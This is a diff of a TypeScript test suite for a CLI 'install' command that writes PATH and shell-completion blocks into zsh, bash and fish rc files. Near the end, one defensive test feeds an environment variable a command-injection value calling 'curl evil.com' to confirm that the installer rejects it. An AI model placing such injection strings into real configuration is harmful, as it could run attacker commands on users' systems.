@@ -12,6 +12,7 @@ import {
 } from 'src/commands/install.cmd';
 import { makeTerminalUI } from 'src/services/terminal-ui';
 import { cli, TestLive, MockConsole } from 'test/__utils__';
+import type { TestLiveInput } from 'test/__utils__/services/test-layer';
 
 const makeSink = (isTTY: boolean) => {
   const chunks: string[] = [];
@@ -39,16 +40,23 @@ const capturedStderrUI = makeTerminalUI({
 const SAFE_PATH = '/usr/bin:/bin';
 const TEST_EXEC_PATH = '/usr/local/bin/composio';
 const expectedRuntimeBinDir = (): string => path.dirname(TEST_EXEC_PATH);
+
+/**
+ * `installShellIntegration` reads the running executable from `NodeProcess`, so
+ * a scenario picks its exec path when it builds the layer, not when it calls
+ * the command.
+ */
+const TestInstallLive = (input: TestLiveInput = {}) =>
+  TestLive({ execPath: () => TEST_EXEC_PATH, ...input });
+
 const install = (
   params: {
     readonly completions?: boolean;
-    readonly execPath?: string;
     readonly shell?: Shell;
   } = {}
 ) =>
   installShellIntegration({
     completions: params.completions ?? false,
-    execPath: params.execPath ?? TEST_EXEC_PATH,
     shell: params.shell,
   });
 
@@ -73,7 +81,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] shell is zsh', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] creates .zshrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -125,7 +133,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] shell is bash', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] creates .bashrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -148,7 +156,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] bash has neither .bash_profile nor .bash_login', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] only .bashrc is created', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -166,7 +174,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] bash has an existing .bash_profile', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped(
         '[Then] the PATH block also lands in .bash_profile, and the restart hint mentions it',
         () =>
@@ -197,7 +205,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] bash updates a private .bash_profile', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] preserves its existing file mode', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -219,7 +227,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] bash has only .bash_login (no .bash_profile)', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the PATH block also lands in .bash_login', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -247,7 +255,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] bash has both .bash_profile and .bash_login', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] only .bash_profile receives the login PATH block', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -271,7 +279,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] .bash_profile is symlinked to the same file as .bashrc', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the PATH block is written exactly once, not once per alias', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -297,11 +305,12 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] shell is fish', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] creates config.fish with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/usr/bin/fish');
+          const expectedBinDir = expectedRuntimeBinDir();
 
           yield* install();
 
@@ -311,7 +320,7 @@ describe('CLI: composio install', () => {
 
           expect(contents).toContain('# Composio CLI');
           expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
-          expect(contents).toContain('set --export PATH');
+          expect(contents).toContain(`set --export PATH "${expectedBinDir}" $PATH`);
           expect(contents).not.toContain('# Composio CLI completions');
         })
       );
@@ -319,7 +328,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --completions is passed', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] writes PATH block and installs completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -343,13 +352,14 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] fish shell installs completions', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped(
         '[Then] keeps PATH setup in config.fish and writes completions to composio.fish',
         () =>
           Effect.gen(function* () {
             const os = yield* NodeOs;
             vi.stubEnv('SHELL', '/usr/bin/fish');
+            const expectedBinDir = expectedRuntimeBinDir();
 
             yield* install({ completions: true });
 
@@ -366,7 +376,7 @@ describe('CLI: composio install', () => {
             const completionContents = yield* fs.readFileString(completionPath);
 
             expect(configContents).toContain('# Composio CLI');
-            expect(configContents).toContain('set --export PATH');
+            expect(configContents).toContain(`set --export PATH "${expectedBinDir}" $PATH`);
             expect(configContents).not.toContain('# Composio CLI completions');
 
             expect(completionContents).toContain('# Composio CLI completions');
@@ -383,7 +393,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] fish config and completions are symlinked to the same file', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] keeps both PATH and completions blocks', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -419,7 +429,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] fish shell installs completions twice', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] keeps config.fish and composio.fish idempotent', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -455,16 +465,16 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --no-completions is passed', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] writes PATH block but skips completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
-          vi.stubEnv('SHELL', '/bin/zsh');
+          vi.stubEnv('SHELL', '/bin/bash');
 
-          yield* install();
+          yield* cli(['install', '--no-completions']);
 
           const fs = yield* FileSystem.FileSystem;
-          const rcPath = path.join(os.homedir, '.zshrc');
+          const rcPath = path.join(os.homedir, '.bashrc');
           const contents = yield* fs.readFileString(rcPath);
 
           expect(contents).toContain('# Composio CLI');
@@ -472,14 +482,34 @@ describe('CLI: composio install', () => {
 
           const lines = yield* MockConsole.getLines();
           const output = lines.join('\n');
-          expect(output).toContain('Completions: skipped for zsh');
+          expect(output).toContain('Completions: skipped by default');
+        })
+      );
+    });
+  });
+
+  describe('[When] --shell and --completions are combined on the public CLI', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] the overridden shell gets both the PATH block and completions', () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/zsh');
+          const expectedBinDir = expectedRuntimeBinDir();
+
+          yield* cli(['install', '--shell', 'bash', '--completions']);
+
+          const contents = yield* fs.readFileString(path.join(os.homedir, '.bashrc'));
+          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
+          expect(contents).toContain('# Composio CLI completions');
+          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(false);
         })
       );
     });
   });
 
   describe('[When] install is run twice (idempotency)', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] does not duplicate entries', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -505,20 +535,19 @@ describe('CLI: composio install', () => {
     });
   });
 
-  describe('[When] .zshrc already has the marker', () => {
-    layer(TestLive())(it => {
-      it.scoped('[Then] reports already configured', () =>
+  describe('[When] .zshrc already has the current managed PATH line', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] reports already configured and leaves the file untouched', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
           vi.stubEnv('SHELL', '/bin/zsh');
+          const expectedBinDir = expectedRuntimeBinDir();
 
-          // Pre-populate .zshrc with existing config
+          // Pre-populate .zshrc with the exact block a previous run would write.
           const rcPath = path.join(os.homedir, '.zshrc');
-          yield* fs.writeFileString(
-            rcPath,
-            '# existing config\n# Composio CLI\nexport PATH="$HOME/.local/bin:$PATH"\n# Composio CLI completions\n_composio() {}\n'
-          );
+          const existing = `# existing config\n\n# Composio CLI\nexport PATH="${expectedBinDir}:$PATH"\n\n# Composio CLI completions\n_composio() {}\n`;
+          yield* fs.writeFileString(rcPath, existing);
 
           yield* install({ completions: true });
 
@@ -528,17 +557,122 @@ describe('CLI: composio install', () => {
           expect(output).toContain('Completions: skipped for zsh');
           expect(output).toContain('Shell integration already configured');
 
-          // File should not have grown
+          expect(yield* fs.readFileString(rcPath)).toBe(existing);
+        })
+      );
+    });
+  });
+
+  describe('[When] an rc file carries the legacy install.sh managed block', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] the stale block is migrated in place, not left or duplicated', () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/zsh');
+          const expectedBinDir = expectedRuntimeBinDir();
+
+          const rcPath = path.join(os.homedir, '.zshrc');
+          yield* fs.writeFileString(
+            rcPath,
+            [
+              '# user config above',
+              '',
+              '# Composio CLI',
+              'export COMPOSIO_INSTALL_DIR="$HOME/.composio"',
+              'export PATH="$COMPOSIO_INSTALL_DIR:$PATH"',
+              '',
+              '# user config below',
+              '',
+            ].join('\n')
+          );
+
+          yield* install();
+
           const contents = yield* fs.readFileString(rcPath);
-          const markerCount = contents.split('# Composio CLI').length - 1;
-          expect(markerCount).toBe(2);
+          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
+          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
+          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
+          // The block is replaced where it stood: the user's own lines keep
+          // their relative order around it.
+          expect(contents.indexOf('# user config above')).toBeLessThan(
+            contents.indexOf('# Composio CLI')
+          );
+          expect(contents.indexOf('# Composio CLI')).toBeLessThan(
+            contents.indexOf('# user config below')
+          );
+
+          const output = (yield* MockConsole.getLines()).join('\n');
+          expect(output).toContain('PATH: will add');
+        })
+      );
+    });
+  });
+
+  describe('[When] a legacy block sits above an existing completions block', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] migrating the PATH block leaves the completions block intact', () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/bash');
+          const expectedBinDir = expectedRuntimeBinDir();
+
+          const rcPath = path.join(os.homedir, '.bashrc');
+          yield* fs.writeFileString(
+            rcPath,
+            [
+              '# Composio CLI',
+              'export COMPOSIO_INSTALL_DIR="$HOME/.composio"',
+              'export PATH="$COMPOSIO_INSTALL_DIR:$PATH"',
+              '',
+              '# Composio CLI completions',
+              '_composio_completions() { :; }',
+              '',
+            ].join('\n')
+          );
+
+          yield* install({ completions: true });
+
+          const contents = yield* fs.readFileString(rcPath);
+          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
+          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
+          expect(contents).toContain('_composio_completions() { :; }');
+          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
+          expect(contents.match(/^# Composio CLI completions$/gm)?.length ?? 0).toBe(1);
+        })
+      );
+    });
+  });
+
+  describe('[When] a migrated rc file is installed into a second time', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] the second run is a no-op', () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/zsh');
+
+          const rcPath = path.join(os.homedir, '.zshrc');
+          yield* fs.writeFileString(
+            rcPath,
+            '# Composio CLI\nexport COMPOSIO_INSTALL_DIR="$HOME/.composio"\nexport PATH="$COMPOSIO_INSTALL_DIR:$PATH"\n'
+          );
+
+          yield* install();
+          const afterFirst = yield* fs.readFileString(rcPath);
+          yield* install();
+          const afterSecond = yield* fs.readFileString(rcPath);
+
+          expect(afterSecond).toBe(afterFirst);
+          expect(afterSecond.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
         })
       );
     });
   });
 
   describe('[When] shell cannot be detected', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] shows manual setup instructions', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '');
@@ -558,7 +692,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] shell cannot be detected but the bin dir is already on $PATH', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] reports already on PATH instead of asking for manual setup', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -583,7 +717,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] stderr is captured rather than a terminal', () => {
-    layer(TestLive({ terminalUI: capturedStderrUI }))(it => {
+    layer(TestInstallLive({ terminalUI: capturedStderrUI }))(it => {
       it.scoped('[Then] still reports the rc file and how to reload the shell', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -614,7 +748,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell zsh overrides a conflicting $SHELL', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] writes ~/.zshrc, not ~/.bashrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -631,7 +765,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell is parsed by the public CLI', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] a valid override reaches the requested shell integration', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -648,7 +782,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell has an unsupported value', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the public CLI rejects it during option parsing', () =>
         Effect.gen(function* () {
           const exit = yield* cli(['install', '--shell', 'powershell']).pipe(Effect.exit);
@@ -659,7 +793,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] both completion flags are parsed by the public CLI', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] --no-completions takes precedence', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -677,7 +811,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell bash overrides a conflicting $SHELL', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] writes ~/.bashrc, not ~/.zshrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -694,7 +828,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell fish is passed with $SHELL unset', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] writes config.fish', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -711,7 +845,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] --shell is explicit and the bin dir is already on the invoking $PATH', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] still writes the requested shell, and re-running stays idempotent', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -731,9 +865,9 @@ describe('CLI: composio install', () => {
     });
   });
 
-  describe('[When] auto-detected shell has its bin dir already on $PATH', () => {
-    layer(TestLive())(it => {
-      it.scoped('[Then] writes nothing and reports already on PATH, with no restart hint', () =>
+  describe('[When] auto-detected shell has its bin dir already on the invoking $PATH', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] the rc file is still written, since a transient $PATH proves nothing', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -743,51 +877,51 @@ describe('CLI: composio install', () => {
           yield* install();
 
           const fs = yield* FileSystem.FileSystem;
-          expect(yield* fs.exists(path.join(os.homedir, '.zshrc'))).toBe(false);
+          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
+          expect(contents).toContain(`export PATH="${binDir}:$PATH"`);
 
           const lines = yield* MockConsole.getLines();
           const output = lines.join('\n');
-          expect(output).toContain('already on $PATH');
-          expect(output).not.toContain('Restart your shell');
+          expect(output).toContain('PATH: will add');
+          expect(output).toContain('Restart your shell');
         })
       );
     });
   });
 
-  describe('[When] a new .bash_profile appears after .bashrc was already configured, and the bin dir is already on $PATH', () => {
-    layer(TestLive())(it => {
-      it.scoped(
-        '[Then] the new .bash_profile still gets the PATH block, not skipped by the reachability check',
-        () =>
-          Effect.gen(function* () {
-            const os = yield* NodeOs;
-            const fs = yield* FileSystem.FileSystem;
-            vi.stubEnv('SHELL', '/bin/bash');
-            const binDir = expectedRuntimeBinDir();
-            vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);
+  describe('[When] a new .bash_profile appears after .bashrc was already configured', () => {
+    layer(TestInstallLive())(it => {
+      it.scoped('[Then] the new .bash_profile gets the PATH block and .bashrc is left alone', () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/bash');
+          const binDir = expectedRuntimeBinDir();
+          vi.stubEnv('PATH', `${SAFE_PATH}:${binDir}`);
 
-            // Simulate a prior `composio install` run that already configured .bashrc.
-            const bashrcPath = path.join(os.homedir, '.bashrc');
-            yield* fs.writeFileString(
-              bashrcPath,
-              `# Composio CLI\nexport PATH="${binDir}:$PATH"\n`
-            );
+          // Simulate a prior `composio install` run that already configured .bashrc.
+          const bashrcPath = path.join(os.homedir, '.bashrc');
+          yield* fs.writeFileString(bashrcPath, `# Composio CLI\nexport PATH="${binDir}:$PATH"\n`);
 
-            // .bash_profile shows up afterward and was never configured.
-            const bashProfilePath = path.join(os.homedir, '.bash_profile');
-            yield* fs.writeFileString(bashProfilePath, '# existing login config\n');
+          // .bash_profile shows up afterward and was never configured.
+          const bashProfilePath = path.join(os.homedir, '.bash_profile');
+          yield* fs.writeFileString(bashProfilePath, '# existing login config\n');
 
-            yield* install();
+          yield* install();
 
-            const bashProfileContents = yield* fs.readFileString(bashProfilePath);
-            expect(bashProfileContents).toContain('# Composio CLI');
-          })
+          const bashProfileContents = yield* fs.readFileString(bashProfilePath);
+          expect(bashProfileContents).toContain('# Composio CLI');
+          // .bashrc already carries the exact current line, so it is untouched.
+          expect(yield* fs.readFileString(bashrcPath)).toBe(
+            `# Composio CLI\nexport PATH="${binDir}:$PATH"\n`
+          );
+        })
       );
     });
   });
 
   describe('[When] COMPOSIO_BIN_DIR is set to a custom directory', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] --shell zsh writes a PATH line for the custom directory', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -806,7 +940,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR is whitespace-only', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] it is treated as unset, not as a literal bin dir', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -825,7 +959,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR has surrounding whitespace around a real value', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the surrounding whitespace is trimmed before it is used', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -843,7 +977,9 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin/composio is the running executable', () => {
-    layer(TestLive())(it => {
+    layer(
+      TestInstallLive({ execPath: homedir => path.join(homedir, '.local', 'bin', 'composio') })
+    )(it => {
       it.scoped('[Then] the PATH line targets ~/.local/bin via a literal $HOME prefix', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -855,7 +991,7 @@ describe('CLI: composio install', () => {
           yield* fs.makeDirectory(localBinDir, { recursive: true });
           yield* fs.writeFileString(localBinComposio, '#!/bin/sh\n');
 
-          yield* install({ execPath: localBinComposio });
+          yield* install();
 
           const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
           expect(contents).toContain('export PATH="$HOME/.local/bin:$PATH"');
@@ -865,8 +1001,27 @@ describe('CLI: composio install', () => {
     });
   });
 
+  describe('[When] the resolved bin dir contains an apostrophe', () => {
+    layer(TestInstallLive({ execPath: () => "/opt/o'brien/bin/composio" }))(it => {
+      it.scoped("[Then] it is written verbatim, since `'` is literal inside double quotes", () =>
+        Effect.gen(function* () {
+          const os = yield* NodeOs;
+          const fs = yield* FileSystem.FileSystem;
+          vi.stubEnv('SHELL', '/bin/zsh');
+
+          yield* install();
+
+          const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
+          expect(contents).toContain(`export PATH="/opt/o'brien/bin:$PATH"`);
+        })
+      );
+    });
+  });
+
   describe('[When] ~/.local/bin/composio is a symlink chain to the running executable', () => {
-    layer(TestLive())(it => {
+    layer(
+      TestInstallLive({ execPath: homedir => path.join(homedir, '.composio-dist', 'composio') })
+    )(it => {
       it.scoped('[Then] the PATH line still targets ~/.local/bin', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -883,7 +1038,7 @@ describe('CLI: composio install', () => {
           yield* fs.symlink(execFile, intermediateLink);
           yield* fs.symlink(intermediateLink, path.join(localBinDir, 'composio'));
 
-          yield* install({ execPath: execFile });
+          yield* install();
 
           const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
           expect(contents).toContain('export PATH="$HOME/.local/bin:$PATH"');
@@ -893,7 +1048,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] ~/.local/bin/composio is a foreign program (e.g. a leftover pip install)', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the PATH line targets the running executable directory instead', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -916,7 +1071,9 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR is set and ~/.local/bin/composio is also the running executable', () => {
-    layer(TestLive())(it => {
+    layer(
+      TestInstallLive({ execPath: homedir => path.join(homedir, '.local', 'bin', 'composio') })
+    )(it => {
       it.scoped('[Then] the env var wins over the ~/.local/bin fallback', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -929,7 +1086,7 @@ describe('CLI: composio install', () => {
           yield* fs.makeDirectory(localBinDir, { recursive: true });
           yield* fs.writeFileString(localBinComposio, '#!/bin/sh\n');
 
-          yield* install({ execPath: localBinComposio });
+          yield* install();
 
           const contents = yield* fs.readFileString(path.join(os.homedir, '.zshrc'));
           expect(contents).toContain('export PATH="/custom/bin:$PATH"');
@@ -940,7 +1097,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin has no composio entry point', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] the PATH line targets the real binary directory', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
@@ -957,12 +1114,12 @@ describe('CLI: composio install', () => {
     });
   });
 
-  describe('[When] COMPOSIO_BIN_DIR contains shell metacharacters', () => {
-    layer(TestLive())(it => {
+  describe('[When] COMPOSIO_BIN_DIR contains characters that expand inside double quotes', () => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] aborts with an error', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
-          vi.stubEnv('COMPOSIO_BIN_DIR', '/tmp/x; curl evil.com');
+          vi.stubEnv('COMPOSIO_BIN_DIR', '/tmp/x$(curl evil.com)');
 
           const error = yield* install().pipe(Effect.flip);
           expect(error).toBeInstanceOf(ShellSetupAbortError);
@@ -978,7 +1135,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR is relative', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] aborts instead of persisting a relative PATH entry', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -996,7 +1153,7 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] COMPOSIO_BIN_DIR contains a PATH delimiter', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive())(it => {
       it.scoped('[Then] aborts instead of persisting multiple PATH entries', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1015,12 +1172,12 @@ describe('CLI: composio install', () => {
   });
 
   describe('[When] the runtime executable resolves to an unsafe directory', () => {
-    layer(TestLive())(it => {
+    layer(TestInstallLive({ execPath: () => '/tmp/we`ird/composio' }))(it => {
       it.scoped('[Then] reports an origin-neutral error', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
 
-          const error = yield* install({ execPath: "/tmp/o'brien/composio" }).pipe(Effect.flip);
+          const error = yield* install().pipe(Effect.flip);
           expect(error).toBeInstanceOf(ShellSetupAbortError);
 
           const output = (yield* MockConsole.getLines()).join('\n');
